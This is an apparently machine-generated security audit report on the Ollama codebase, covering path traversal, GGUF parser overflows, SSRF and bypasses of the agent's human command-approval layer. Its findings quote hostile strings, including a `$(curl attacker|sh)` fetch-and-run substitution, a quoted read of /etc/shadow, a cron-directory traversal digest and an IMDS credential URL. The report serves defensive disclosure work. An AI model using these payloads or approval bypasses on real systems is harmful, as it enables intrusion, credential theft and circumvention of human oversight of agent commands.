# Security Audit Report: ollama/ollama
=========================================

## Executive Summary
Merged sources: `/tmp/merge-ollama/ollama-archon`, `/tmp/merge-ollama/ollama-with-opus-4.7`

Merge normalization retained 45 promoted findings from 68 merged finding directories and quarantined 21 entries that could not satisfy the promotion contract.

This merged audit consolidates 45 promoted findings for ollama/ollama: 3 critical, 7 high, and 35 medium. The most serious issues enable host command execution through agent approval bypasses, arbitrary filesystem writes through digest path traversal, and memory-corrupting GGUF parser abuse. High-severity exposure is concentrated in unauthenticated network reachability, parser-driven denial of service, and trust-boundary mistakes around local/agent workflows.

## Methodology Summary
- **Intelligence Gathering:** Advisory collection, architecture inventory, dependency analysis, and merged-run normalization review.
- **Knowledge Base:** Threat modeling, architecture and attack-surface mapping, and phase outputs consolidated into `archon/knowledge-base-report.md`.
- **Static Analysis:** CodeQL structural extraction, CodeQL/Semgrep security scans, and targeted custom query artifacts in `archon/codeql-artifacts/` and `archon/semgrep-rules/`.
- **Review Chambers:** Multi-agent debate outputs preserved under `archon/chamber-workspace/`, with promoted findings merged and renumbered into the current `archon/findings/` tree.
- **Verification:** Per-finding PoC building where available, adversarial review coverage for selected high-risk findings, and merged post-processing recorded in `archon/audit-state.json`.

## Summary of Findings

| ID | Title | Severity | PoC Status | Parent |
|----|-------|----------|------------|--------|
| C1 | Autoallow Prefix Metachar Bypass | CRITICAL | theoretical | H6 |
| C2 | Pullwithtransfer Digest Path Traversal | CRITICAL | executed | -- |
| C3 | GGUF Shape Uint64 Overflow Oob | CRITICAL | executed | -- |
| H1 | API Pull SSRF | HIGH | executed | -- |
| H2 | Manifest Token OOM | HIGH | executed | -- |
| H3 | GGUF String Unbounded Alloc | HIGH | executed | -- |
| H4 | MTMD Null Deref Image Bitmap | HIGH | theoretical | -- |
| H5 | Allowedhost Suffix Squat Localhost Local Internal | HIGH | executed | -- |
| H6 | Agent Approval Shell Metachar Bypass | HIGH | executed | -- |
| H7 | Agent Approval Command Substitution Path | HIGH | executed | -- |
| M1 | Download Stat Oracle Digest Traversal | MEDIUM | pending | C2 |
| M2 | Realm HTTP Downgrade | MEDIUM | executed | -- |
| M3 | Client2 Unbounded Body | MEDIUM | pending | -- |
| M4 | Content Range Not Validated | MEDIUM | pending | -- |
| M5 | Cdn Scheme Downgrade | MEDIUM | pending | -- |
| M6 | Cache Hit No Hash Verify | MEDIUM | pending | -- |
| M7 | Session Replay No Nonce | MEDIUM | pending | -- |
| M8 | GGUF Array Length Truncation | MEDIUM | executed | -- |
| M9 | Template Vars Execute Amplification | MEDIUM | executed | -- |
| M10 | Create Safetensors Symlink Follow | MEDIUM | executed | -- |
| M11 | Graphsize Nil Type Assertion | MEDIUM | pending | -- |
| M12 | GGUF Alignment Zero Divide By Zero | MEDIUM | executed | -- |
| M13 | GGUF V1 String Truncate Panic | MEDIUM | pending | -- |
| M14 | GGUF Numkv Unbounded | MEDIUM | pending | -- |
| M15 | Wordpiece Rune Amplification | MEDIUM | pending | -- |
| M16 | Tokenizer Vocab Size Mismatch | MEDIUM | pending | -- |
| M17 | GGUF String Int Cast Panic DoS | MEDIUM | pending | -- |
| M18 | Embeddings Seq Unsafe Slice Nembd | MEDIUM | pending | -- |
| M19 | MLXRunner Manifest Path Traversal Defense In Depth | MEDIUM | pending | -- |
| M20 | Lora Path IPC To cgo Passthrough | MEDIUM | pending | -- |
| M21 | Cstring Leak Load Model From File | MEDIUM | pending | -- |
| M22 | Audio Mel Path Uncapped API Generate | MEDIUM | pending | -- |
| M23 | Llama Adapter Lora Struct Leak | MEDIUM | pending | -- |
| M24 | Streaming Response Clean Eof Silent Truncation | MEDIUM | pending | -- |
| M25 | cgo Log Callback Reentrancy Deadlock Latent | MEDIUM | pending | -- |
| M26 | Ollama Host Nonloopback Shortcircuits Allowedhosts | MEDIUM | executed | -- |
| M27 | Client2 Experiment Bypasses Middleware | MEDIUM | executed | -- |
| M28 | Readrequestbody Unbounded Cloud Proxy | MEDIUM | executed | -- |
| M29 | Web Search Fetch Unauth Signing Oracle | MEDIUM | executed | -- |
| M30 | Editor Visual Flag Injection Exec | MEDIUM | executed | -- |
| M31 | Whoami Public Key Disclosure | MEDIUM | pending | -- |
| M32 | Signin Url Unmarshal Error Discarded | MEDIUM | pending | -- |
| M33 | Dns Rebinding Drive By IDentity Chain | MEDIUM | pending | -- |
| M34 | Isprivate Rfc1918 Host Header Permissive | MEDIUM | pending | -- |
| M35 | WWWAuth Realm Comma Parser Truncation | MEDIUM | pending | -- |

## Technical Findings Detail

### [C2] Pullwithtransfer Digest Path Traversal
- **Severity:** CRITICAL
- **Summary:** `pullWithTransfer` (Ollama's fast transfer path for models with tensor layers) passes every layer's `Digest` string, verbatim, into `x/imagegen/transfer.Blob{Digest}`. The transfer package's internal `digestToPath` helper performs only a naive `sha256:` → `sha256-` substitution and never calls `manifest.BlobsPath()`, which is the only function that enforces the `^sha256[:-][0-9a-fA-F]{64}$` regex. A malicious registry can therefore advertise a manifest whose layer `Digest` contains path-traversal components (e.g., `sha256:../../../../../etc/cron.d/pwn`). During the pull, `x/imagegen/transfer/download.go:213-215` calls `os.MkdirAll(filepath.Dir(dest), 0o755)` followed by `os.Create(tmp)`, wr…
- **Impact:** Arbitrary directory tree creation (`os.MkdirAll(..., 0o755)`) at any path writable by ollama user.
- **Root Cause:** Validated rationale: pullWithTransfer passes raw layer.Digest into transfer.Blob; digestToPath does strings.Replace with no IsLocal/regex, while Advocate confirmed no blocking protection on this call chain (BlobsPath regex is never invoked by the transfer package).
- **Key Code Reference:** `server/images.go:720-793` — `pullWithTransfer`
- **PoC Status:** executed
- **Finding Reference:** Phase: 8; Sequence: 002; Slug: pullwithtransfer-digest-path-traversal; Verdict: VALID; Rationale: pullWithTransfer passes raw layer.Digest into transfer.Blob; digestToPath does strings.Replace with no IsLocal/regex, while Advocate confirmed no blocking protection on this call…; Severity-Original: CRITICAL; PoC-Status: executed; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/C2-pullwithtransfer-digest-path-traversal/report.md
- **Proof of Concept:** archon/findings/C2-pullwithtransfer-digest-path-traversal/poc.py
- **Evidence:** archon/findings/C2-pullwithtransfer-digest-path-traversal/evidence/

### [C3] GGUF Shape Uint64 Overflow Oob
- **Severity:** CRITICAL
- **Summary:** `fs/ggml/ggml.go:505-514` computes `Tensor.Elements()` and `Tensor.Size()` using unchecked uint64 multiplication over the attacker-supplied `Shape []uint64`. A crafted `Shape = [0x4000000000000001, 1]` with `Kind = F32` causes `Elements() = 0x4000000000000001` and `Size() = (Elements * 4) mod 2^64 = 4` -- the bounds check at `fs/ggml/gguf.go:260` (`tensorEnd > uint64(fileSize)`) is satisfied by the wrapped `Size()`. Downstream call sites (`server/quantization.go:43`, `ml/backend/ggml/quantization.go:24`) still use the un-wrapped `Elements()` value to size `unsafe.Slice(ptr, Elements())`, producing a slice header declaring ~4.6 billion float32 entries backed by only 4 bytes of mapped storage…
- **Impact:** Information disclosure of adjacent mmapped tensors from OTHER models in the blob store (cross-tenant weight theft on shared hosts).
- **Root Cause:** Validated rationale: Attacker-controlled Shape[] produces uint64 overflow in Tensor.Elements()/Size() which wraps Size() to a small value, defeating the tensorEnd > fileSize guard while leaving Elements() at its huge pre-wrap value; downstream unsafe.Slice(ptr, Elements()) + cgo ggml_fp16_to_fp32_row reads past the mmapped tensor region into adjacent memory.
- **Key Code Reference:** `fs/ggml/ggml.go:505-514` -- `Tensor.Elements()` and `Tensor.Size()` (no overflow check)
- **PoC Status:** executed
- **Finding Reference:** Phase: 8; Sequence: 003; Slug: gguf-shape-uint64-overflow-oob; Verdict: VALID; Rationale: Attacker-controlled Shape[] produces uint64 overflow in Tensor.Elements()/Size() which wraps Size() to a small value, defeating the tensorEnd > fileSize guard while leaving Elemen…; Severity-Original: CRITICAL; PoC-Status: executed; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/C3-gguf-shape-uint64-overflow-oob/report.md
- **Proof of Concept:** archon/findings/C3-gguf-shape-uint64-overflow-oob/poc.py
- **Evidence:** archon/findings/C3-gguf-shape-uint64-overflow-oob/evidence/

### [H1] API Pull SSRF
- **Severity:** HIGH
- **Summary:** `POST /api/pull` accepts a user-supplied model name whose host component flows directly into an outgoing `GET http://<host>/v2/<ns>/<repo>/manifests/<tag>` request. The host validator `isValidPart(kindHost, s)` permits any run of letters, digits, `.`, `-`, `_`, and `:` — including link-local IPs such as `169.254.169.254` and private ranges. When the caller passes `"insecure":true`, the `http://` protocol scheme is accepted without objection. Response bodies from the SSRF target flow back to the API caller through the error message formatter (`fmt.Errorf("pull model manifest: %s", err)`), where `err` already wraps a body-containing message, enabling credential exfiltration from cloud metadat…
- **Impact:** Read IMDS: `GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` → AWS temporary credentials exfiltrated through reflected error body.
- **Root Cause:** Validated rationale: isValidPart(kindHost) accepts arbitrary dotted IP/hostnames including 169.254.169.254; Insecure=true allows HTTP; error body is reflected via fmt.Errorf — Advocate confirmed no outbound host allowlist, IMDS block, or private-IP filter.
- **Key Code Reference:** `server/images.go:615-617` — `if n.ProtocolScheme == "http" && !regOpts.Insecure { return errInsecureProtocol }`
- **PoC Status:** executed
- **Finding Reference:** Phase: 8; Sequence: 001; Slug: api-pull-ssrf; Verdict: VALID; Rationale: isValidPart(kindHost) accepts arbitrary dotted IP/hostnames including 169.254.169.254; Insecure=true allows HTTP; error body is reflected via fmt.Errorf — Advocate confirmed no ou…; Severity-Original: HIGH; PoC-Status: executed; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/H1-api-pull-ssrf/report.md
- **Proof of Concept:** archon/findings/H1-api-pull-ssrf/poc.py
- **Evidence:** archon/findings/H1-api-pull-ssrf/evidence/

### [H2] Manifest Token OOM
- **Severity:** HIGH
- **Summary:** Two unbounded `io.ReadAll(resp.Body)` sinks run during a single `/api/pull` to an attacker-controlled registry:
- **Impact:** Process OOM → SIGKILL by the kernel OOM killer.
- **Root Cause:** Validated rationale: Two separate unbounded io.ReadAll sinks (manifest + token response) fire during a single /api/pull to an attacker-controlled registry; Advocate confirmed no LimitReader or MaxBytesReader anywhere in the chain.
- **Key Code Reference:** `server/images.go:864` — `data, err := io.ReadAll(resp.Body)` (manifest)
- **PoC Status:** executed
- **Finding Reference:** Phase: 8; Sequence: 002; Slug: manifest-token-oom; Verdict: VALID; Rationale: Two separate unbounded io.ReadAll sinks (manifest + token response) fire during a single /api/pull to an attacker-controlled registry; Advocate confirmed no LimitReader or MaxByte…; Severity-Original: HIGH; PoC-Status: executed; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/H2-manifest-token-oom/report.md
- **Proof of Concept:** archon/findings/H2-manifest-token-oom/poc.go
- **Evidence:** archon/findings/H2-manifest-token-oom/evidence/

### [H3] GGUF String Unbounded Alloc
- **Severity:** HIGH
- **Summary:** Two independent GGUF parsers -- `fs/ggml/gguf.go:348-371` (eager) and `fs/gguf/gguf.go:188-205` (lazy) -- both read a uint64 length from the input stream and use it as an allocation size for a scratch buffer with no cap.
- **Impact:** Single-request process OOM kill on any host with less RAM than the attacker-declared string length (attacker can declare up to 9.2 EB on a 64-bit host; Linux OOM-killer fires before any Go panic recovery).
- **Root Cause:** Validated rationale: readGGUFString and readString both read an attacker uint64 length from the GGUF header and pass it directly to make([]byte, length) without any cap against file size or a hard ceiling, enabling instant OOM DoS reachable from the lazy parser on /api/show.
- **Key Code Reference:** `fs/ggml/gguf.go:359-361` -- `length := int(llm.ByteOrder.Uint64(buf)); if length > len(llm.scratch) { buf = make([]byte, length) }`
- **PoC Status:** executed
- **Finding Reference:** Phase: 8; Sequence: 003; Slug: gguf-string-unbounded-alloc; Verdict: VALID; Rationale: readGGUFString and readString both read an attacker uint64 length from the GGUF header and pass it directly to make([]byte, length) without any cap against file size or a hard cei…; Severity-Original: HIGH; PoC-Status: executed; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/H3-gguf-string-unbounded-alloc/report.md
- **Proof of Concept:** archon/findings/H3-gguf-string-unbounded-alloc/poc.py
- **Evidence:** archon/findings/H3-gguf-string-unbounded-alloc/evidence/

### [H4] MTMD Null Deref Image Bitmap
- **Severity:** HIGH
- **Summary:** `llama/llama.go:566-570` passes arbitrary bytes to `C.mtmd_helper_bitmap_init_from_buf`, which returns NULL when the bytes are not a supported image (PNG/JPEG/BMP/TGA/GIF) or audio (RIFF/WAVE) format. The code sets up a deferred `C.mtmd_bitmap_free(bm)` (which is NULL-safe) but then unconditionally calls `C.mtmd_tokenize(c.c, ic, it, &bm, 1)` at line 570 — passing a pointer to a NULL pointer. In `mtmd.cpp:465` the function reads `bitmap = bitmaps[0]` = NULL and then `mtmd.cpp:538` dereferences it (`bitmap->is_audio`), producing SIGSEGV in the runner subprocess. Any unauthenticated request with any non-image, non-audio base64 payload (≥ 1 byte) crashes the runner.
- **Impact:** Runner subprocess SIGSEGV. Every concurrent inference session on that runner is dropped. The scheduler respawns the runner, but the model must re-load from disk (seconds to minutes), and the crash is triggerable by a single ~50-byte request. An attacker can hold the runner permanently unavailable with a request rate lower than the cold-start time. Parent `ollama serve` keeps running but cannot service any inference. The HTTP client receives an internal-server-error / broken-stream response. Cross-user impact: a single malicious request drops all active sessions on that model.
- **Root Cause:** Validated rationale: Tracer confirmed `mtmd_helper_bitmap_init_from_buf` returns NULL for any non-image byte payload and `llama/llama.go:570` calls `mtmd_tokenize(&bm, 1)` without checking `bm == NULL`, dereferencing a null `llama_image_u8*` at `mtmd.cpp:552` — advocate's `image.Decode` defense applies only to the ollamarunner path, not the llamarunner/mtmd path.
- **Key Code Reference:** `llama/llama.go:566` -- `bm := C.mtmd_helper_bitmap_init_from_buf(...)` — returns NULL on unrecognized format
- **PoC Status:** theoretical
- **Finding Reference:** Phase: 8; Sequence: 004; Slug: mtmd-null-deref-image-bitmap; Verdict: VALID; Rationale: Tracer confirmed `mtmd_helper_bitmap_init_from_buf` returns NULL for any non-image byte payload and `llama/llama.go:570` calls `mtmd_tokenize(&bm, 1)` without checking `bm == NULL…; Severity-Original: HIGH; PoC-Status: theoretical; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/H4-mtmd-null-deref-image-bitmap/report.md
- **Proof of Concept:** archon/findings/H4-mtmd-null-deref-image-bitmap/poc.py
- **Evidence:** archon/findings/H4-mtmd-null-deref-image-bitmap/evidence/

### [H5] Allowedhost Suffix Squat Localhost Local Internal
- **Severity:** HIGH
- **Summary:** `allowedHost()` at `server/routes.go:1581-1606` performs three purely-lexical suffix checks:
- **Impact:** Cross-origin reads against the daemon for any endpoint reachable via CORS "simple request" (GET, POST with `text/plain` / `application/x-www-form-urlencoded` / `multipart/form-data`).
- **Root Cause:** Validated rationale: `server/routes.go:1592-1603` accepts ANY hostname ending in `.localhost`, `.local`, or `.internal` via `strings.HasSuffix` with no DNS resolution or IP verification — browsers per RFC 6761 auto-resolve `*.localhost` to 127.0.0.1 without DNS, turning every visited webpage into an on-host cross-origin primitive against local Ollama; Advocate notes CORS blocks preflighted JSON POSTs from non-allowed origins, but simple-request endpoints and allowed-origin contexts (browser extensions, vscode-webview, electron) remain exploitable.
- **Key Code Reference:** `server/routes.go:1581-1606` — `allowedHost()`
- **PoC Status:** executed
- **Finding Reference:** Phase: 8; Sequence: 005; Slug: allowedhost-suffix-squat-localhost-local-internal; Verdict: VALID; Rationale: `server/routes.go:1592-1603` accepts ANY hostname ending in `.localhost`, `.local`, or `.internal` via `strings.HasSuffix` with no DNS resolution or IP verification — browsers per…; Severity-Original: HIGH; PoC-Status: executed; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/H5-allowedhost-suffix-squat-localhost-local-internal/report.md
- **Proof of Concept:** archon/findings/H5-allowedhost-suffix-squat-localhost-local-internal/poc.sh
- **Evidence:** archon/findings/H5-allowedhost-suffix-squat-localhost-local-internal/evidence/

### [H6] Agent Approval Shell Metachar Bypass
- **Severity:** HIGH
- **Summary:** Three compounding defects produce a single command-injection primitive in the agent's approval layer:
- **Impact:** Arbitrary command execution on the victim's host with the ollama-user's privileges. Sample payloads that bypass both IsDenied and the prefix cache after a single "Allow for session" click on `cat tools/readme.md`:
- **Root Cause:** Validated rationale: `extractBashPrefix` at `x/agent/approval.go:204-206` splits the command on `|` only — `;`, `&&`, `||`, `$()`, backticks all pass through — so approving `cat tools/file` caches the prefix `cat:tools/`, which then auto-approves `cat tools/file.go && cat /e''tc/shadow`; `IsDenied` uses `strings.Contains` with raw patterns, defeatable by any inline quoting (`''`, `""`, `\x??`). The agent then spawns via `exec.Command("bash","-c", cmd)` which IS a shell (not execve), so injected metachars execute. Advocate agrees; UI confirmation is the only remaining check and relies entirely on user vigilance for long commands.
- **Key Code Reference:** `x/agent/approval.go:94-122` — `denyPatterns` and `IsDenied` substring matcher
- **PoC Status:** executed
- **Finding Reference:** Phase: 8; Sequence: 006; Slug: agent-approval-shell-metachar-bypass; Verdict: VALID; Rationale: `extractBashPrefix` at `x/agent/approval.go:204-206` splits the command on `|` only — `;`, `&&`, `||`, `$()`, backticks all pass through — so approving `cat tools/file` caches the…; Severity-Original: CRITICAL; PoC-Status: executed; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/H6-agent-approval-shell-metachar-bypass/report.md
- **Proof of Concept:** missing
- **Evidence:** archon/findings/H6-agent-approval-shell-metachar-bypass/evidence/

#### Variants

| ID | Title | Severity | Location | PoC Status |
|----|-------|----------|----------|------------|
| C1 | Autoallow Prefix Metachar Bypass | CRITICAL | `x/agent/approval.go:71-92` — `autoAllowPrefixes` slice (24 entries, all without metachar awareness) | theoretical |

See individual variant reports: archon/findings/C1-autoallow-prefix-metachar-bypass/report.md

### [H7] Agent Approval Command Substitution Path
- **Severity:** HIGH
- **Summary:** Distinct primitive from p8-065: in p8-065 the injection lives AFTER the first pipe-segment. Here the injection lives INSIDE the first argument — specifically, as a command substitution embedded in what looks syntactically like a filesystem path.
- **Impact:** Same as p8-065: one approval = session RCE. This finding is listed separately because (a) the attack vector is syntactically different, (b) a fix for p8-065's metachar-split does NOT address substitution-inside-path unless the parser also rejects `$(` / backticks inside path tokens, (c) the denylist extension needed is orthogonal.
- **Root Cause:** Validated rationale: `extractBashPrefix` treats `$(...)` inside an argument as part of the path literal: `cat tools/$(curl attacker|sh)` produces cache key `cat:tools/` (the `$(...)` is not recognized as shell syntax); once the user approves any `cat tools/*` command, this variant auto-approves and `bash -c` executes the command substitution. Advocate concedes `$()` / backticks are not in denyPatterns and the UI display is the only remaining guard.
- **Key Code Reference:** `x/agent/approval.go:215-284` — prefix extraction; `$()`/backticks not recognized as shell syntax
- **PoC Status:** executed
- **Finding Reference:** Phase: 8; Sequence: 007; Slug: agent-approval-command-substitution-path; Verdict: VALID; Rationale: `extractBashPrefix` treats `$(...)` inside an argument as part of the path literal: `cat tools/$(curl attacker|sh)` produces cache key `cat:tools/` (the `$(...)` is not recognized…; Severity-Original: HIGH; PoC-Status: executed; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/H7-agent-approval-command-substitution-path/report.md
- **Proof of Concept:** archon/findings/H7-agent-approval-command-substitution-path/poc.go
- **Evidence:** archon/findings/H7-agent-approval-command-substitution-path/evidence/

### [M2] Realm HTTP Downgrade
- **Severity:** MEDIUM
- **Summary:** `server/auth.go:53-100` guards the token endpoint URL against cross-host leakage by comparing `redirectURL.Host != originalHost`. It does NOT compare schemes. A malicious registry (or MITM at TLS termination) can respond with:
- **Impact:** Token theft: the token returned by the attacker's HTTP endpoint is attacker-controlled (they set the response body); the signed request headers are captured for use against the true registry.
- **Root Cause:** Validated rationale: server/auth.go:60 checks redirectURL.Host != originalHost but never asserts Scheme == "https"; a realm="http://registry/token" passes, causing the ed25519-signed Authorization header to be sent over plaintext — Advocate found no scheme enforcement anywhere in the getAuthorizationToken path.
- **Key Code Reference:** `server/auth.go:53-100` — `getAuthorizationToken`
- **PoC Status:** executed
- **Finding Reference:** Phase: 8; Sequence: 002; Slug: realm-http-downgrade; Verdict: VALID; Rationale: server/auth.go:60 checks redirectURL.Host != originalHost but never asserts Scheme == "https"; a realm="http://registry/token" passes, causing the ed25519-signed Authorization hea…; Severity-Original: HIGH; PoC-Status: executed; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/M2-realm-http-downgrade/report.md
- **Proof of Concept:** missing
- **Evidence:** archon/findings/M2-realm-http-downgrade/evidence/

### [M3] Client2 Unbounded Body
- **Severity:** MEDIUM
- **Summary:** When `OLLAMA_EXPERIMENT=client2` is set, `server/internal/registry/server.go:264` dispatches `/api/pull` before the gin middleware chain runs. `handlePull` decodes the JSON body with `decodeUserJSON[*params](r.Body)` which wraps `json.NewDecoder(r.Body).Decode(...)` without any `http.MaxBytesReader` wrapper or `Content-Length` pre-check. A multi-GB JSON body (or a never-ending stream of whitespace followed by a single JSON token) is consumed in its entirety.
- **Impact:** Memory-exhaustion DoS on each `/api/pull`; cheap to execute.
- **Root Cause:** Validated rationale: OLLAMA_EXPERIMENT=client2 routes /api/pull through registry.Local.serveHTTP → handlePull → decodeUserJSON without gin's BodyLimit middleware; Advocate confirmed MaxBytesReader is absent.
- **Key Code Reference:** `server/internal/registry/server.go:264` — `decodeUserJSON[*params](r.Body)` (per Group A probe — cluster also contains the `handlePull` dispatcher)
- **PoC Status:** pending
- **Finding Reference:** Phase: 8; Sequence: 003; Slug: client2-unbounded-body; Verdict: VALID; Rationale: OLLAMA_EXPERIMENT=client2 routes /api/pull through registry.Local.serveHTTP → handlePull → decodeUserJSON without gin's BodyLimit middleware; Advocate confirmed MaxBytesReader is…; Severity-Original: MEDIUM; PoC-Status: pending; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/M3-client2-unbounded-body/report.md
- **Proof of Concept:** missing
- **Evidence:** archon/findings/M3-client2-unbounded-body/evidence/

### [M4] Content Range Not Validated
- **Severity:** MEDIUM
- **Summary:** that `resp.StatusCode == http.StatusPartialContent` (a 200 OK is silently accepted)
- **Impact:** Persistent stuck downloads; user-visible DoS of pulls. The hash check prevents silent corruption, so this is classified MEDIUM (availability only, not integrity).
- **Root Cause:** Validated rationale: downloadChunk sends a Range request but does not verify resp.StatusCode == 206 or parse Content-Range; io.CopyN unconditionally copies `part.Size - completed` bytes from the body; Advocate confirmed no downstream validation.
- **Key Code Reference:** `server/download.go:331-389` — `downloadChunk`
- **PoC Status:** pending
- **Finding Reference:** Phase: 8; Sequence: 004; Slug: content-range-not-validated; Verdict: VALID; Rationale: downloadChunk sends a Range request but does not verify resp.StatusCode == 206 or parse Content-Range; io.CopyN unconditionally copies `part.Size - completed` bytes from the body;…; Severity-Original: MEDIUM; PoC-Status: pending; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/M4-content-range-not-validated/report.md
- **Proof of Concept:** missing
- **Evidence:** archon/findings/M4-content-range-not-validated/evidence/

### [M5] Cdn Scheme Downgrade
- **Severity:** MEDIUM
- **Summary:** When a blob is fetched, `server/download.go:229-270` issues an initial request to the registry and, via a `CheckRedirect` hook, stops at the first redirect whose hostname differs from the original. `resp.Location()` is returned as `directURL` without any check on its scheme. If the registry (or a MITM on the registry response) returns `302 Location: http://cdn.attacker.com/blob/...`, all subsequent Range requests are sent over plaintext HTTP. Combined with Finding 009 (no 206/Content-Range validation), attacker on the HTTP path can stall downloads; combined with a hash collision or prior substitution (Finding 013 in shared-cache configs), bytes are exfiltrated or replaced.
- **Impact:** Blob bytes travel plaintext — observable by any network-adjacent party.
- **Root Cause:** Validated rationale: blobDownload.Prepare stores resp.Location() directly as directURL with no scheme validation; all subsequent downloadChunk calls use whatever scheme the registry redirected to — Advocate found no Scheme assertion and the CheckRedirect hook only checks Hostname.
- **Key Code Reference:** `server/download.go:229-270` — redirect resolution and `directURL` storage
- **PoC Status:** pending
- **Finding Reference:** Phase: 8; Sequence: 005; Slug: cdn-scheme-downgrade; Verdict: VALID; Rationale: blobDownload.Prepare stores resp.Location() directly as directURL with no scheme validation; all subsequent downloadChunk calls use whatever scheme the registry redirected to — Ad…; Severity-Original: MEDIUM; PoC-Status: pending; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/M5-cdn-scheme-downgrade/report.md
- **Proof of Concept:** missing
- **Evidence:** archon/findings/M5-cdn-scheme-downgrade/evidence/

### [M6] Cache Hit No Hash Verify
- **Severity:** MEDIUM
- **Summary:** `server/download.go:478 downloadBlob` returns `cacheHit=true` purely on `os.Stat(fp)` succeeding — no size check, no hash check, no owner check. `server/images.go:641-660 PullModel` stores `skipVerify[layer.Digest] = cacheHit` and at line 657-660 skips `verifyBlob` whenever the flag is set. Consequence: any process that can write to `<OLLAMA_MODELS>/blobs/sha256-<digest>` can substitute model weights for any future pull of that digest, bypassing integrity verification entirely.
- **Impact:** Substitute model weights for any cached digest; victim believes they are running the expected model (`ollama show` reports the legitimate digest) but the bytes loaded by llama.cpp / imagegen come from the attacker.
- **Root Cause:** Validated rationale: server/download.go:478 returns cacheHit=true on bare os.Stat; server/images.go:658 uses skipVerify to bypass verifyBlob for cache-hits; local co-tenant with blob-dir write access substitutes malicious bytes — Advocate confirmed no alternate hash check on the cache-hit path.
- **Key Code Reference:** `server/download.go:467-492` — `downloadBlob`
- **PoC Status:** pending
- **Finding Reference:** Phase: 8; Sequence: 006; Slug: cache-hit-no-hash-verify; Verdict: VALID; Rationale: server/download.go:478 returns cacheHit=true on bare os.Stat; server/images.go:658 uses skipVerify to bypass verifyBlob for cache-hits; local co-tenant with blob-dir write access…; Severity-Original: MEDIUM; PoC-Status: pending; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/M6-cache-hit-no-hash-verify/report.md
- **Proof of Concept:** missing
- **Evidence:** archon/findings/M6-cache-hit-no-hash-verify/evidence/

### [M7] Session Replay No Nonce
- **Severity:** MEDIUM
- **Summary:** `api/client.go do()` constructs the signing challenge as `method + "," + path + "?ts=" + now` — purely client-side, no server-supplied nonce. The server verifier (when `OLLAMA_AUTH=1`) must accept a timestamp window to tolerate clock skew and network latency. Any network observer or MITM who captures an `Authorization: <pubkey>:<sig>` header of a signed request can replay the same header within the tolerance window against any endpoint accepting the same `method+path+ts` tuple.
- **Impact:** Replay of authenticated requests (`POST /api/delete`, `POST /api/push`, `POST /api/create`) within the timestamp tolerance window.
- **Root Cause:** Validated rationale: api/client.go constructs signing challenge as method+path+ts with no server-supplied nonce; captured Authorization headers replay within timestamp tolerance — Advocate concurred as design gap, gated by non-default OLLAMA_AUTH=1.
- **Key Code Reference:** `api/client.go` — `do()` method; challenge construction at `fmt.Sprintf("%s,%s?ts=%s", method, path, now)` (exact line varies by HEAD; grep for `%s,%s?ts=`).
- **PoC Status:** pending
- **Finding Reference:** Phase: 8; Sequence: 007; Slug: session-replay-no-nonce; Verdict: VALID; Rationale: api/client.go constructs signing challenge as method+path+ts with no server-supplied nonce; captured Authorization headers replay within timestamp tolerance — Advocate concurred a…; Severity-Original: MEDIUM; PoC-Status: pending; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/M7-session-replay-no-nonce/report.md
- **Proof of Concept:** missing
- **Evidence:** archon/findings/M7-session-replay-no-nonce/evidence/

### [M8] GGUF Array Length Truncation
- **Severity:** MEDIUM
- **Summary:** `fs/ggml/gguf.go:424-437` reads the array length `n` as uint64, then calls `newArray[T](int(n), llm.maxArraySize)`. On 64-bit platforms, `int(n)` for `n >= 2^63` wraps to a negative int. `newArray` at `fs/ggml/gguf.go:416-422` gates allocation on `size <= maxSize` which is trivially true for any negative size, so `make([]T, size)` is invoked with a negative length and panics.
- **Impact:** Recoverable panic (gin.Recovery catches `runtime: makeslice: len out of range` as a standard runtime.Error). Effect is DoS-per-request returning 500. Severity is MEDIUM rather than HIGH because Recovery middleware catches the panic when reached through HTTP handlers; the vulnerability is still real when reached from background scheduler goroutines or non-gin code paths (model-load from `ml/backend/ggml`).
- **Root Cause:** Validated rationale: readGGUFArray reads an attacker uint64 as the array length, then casts to int. On 64-bit the cast wraps large values to negative; newArray's gate compares against maxSize and lets negative values through, reaching make([]T, negative) which panics with "makeslice: len out of range".
- **Key Code Reference:** `fs/ggml/gguf.go:430-437` -- `n, _ := readGGUF[uint64]; ...; newArray[T](int(n), llm.maxArraySize)`
- **PoC Status:** executed
- **Finding Reference:** Phase: 8; Sequence: 008; Slug: gguf-array-length-truncation; Verdict: VALID; Rationale: readGGUFArray reads an attacker uint64 as the array length, then casts to int. On 64-bit the cast wraps large values to negative; newArray's gate compares against maxSize and lets…; Severity-Original: MEDIUM; PoC-Status: executed; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/M8-gguf-array-length-truncation/report.md
- **Proof of Concept:** missing
- **Evidence:** archon/findings/M8-gguf-array-length-truncation/evidence/

### [M9] Template Vars Execute Amplification
- **Severity:** MEDIUM
- **Summary:** This finding consolidates three related template-side DoS vectors (originally H-06, H-21, H-22):
- **Impact:** Per-request CPU cost scales with `template_nodes × request_body_size` -- easily 1000× amplification measured in CPU-ms per KB of attacker input.
- **Root Cause:** Validated rationale: Template size uncapped at parse-time; Vars() walks every template node on every Execute call; nested {{range}} × {{json}} constructs amplify a single request into N*M marshal operations; combined with the persistent nature of TEMPLATE-layer blobs this is a plant-once-DoS-forever pattern.
- **Key Code Reference:** `template/template.go:145` -- `Parse` with no size cap
- **PoC Status:** executed
- **Finding Reference:** Phase: 8; Sequence: 009; Slug: template-vars-execute-amplification; Verdict: VALID; Rationale: Template size uncapped at parse-time; Vars() walks every template node on every Execute call; nested {{range}} × {{json}} constructs amplify a single request into N*M marshal oper…; Severity-Original: HIGH; PoC-Status: executed; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/M9-template-vars-execute-amplification/report.md
- **Proof of Concept:** missing
- **Evidence:** archon/findings/M9-template-vars-execute-amplification/evidence/

